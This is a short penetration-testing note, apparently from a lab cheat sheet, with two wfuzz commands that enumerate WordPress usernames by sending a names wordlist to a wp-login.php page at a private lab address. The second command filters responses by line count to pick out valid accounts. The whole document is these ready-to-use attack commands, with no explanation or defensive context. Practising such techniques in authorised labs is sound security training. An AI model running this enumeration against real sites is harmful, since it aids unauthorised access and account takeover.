Wfuzz Userenum:

wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -c -d "log=FUZZ&pwd=anything" <http://10.11.1.251/wp/wp-login.php>
wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -c --hl 80 -d "log=FUZZ&pwd=anything" <http://10.11.1.251/wp/wp-login.php>

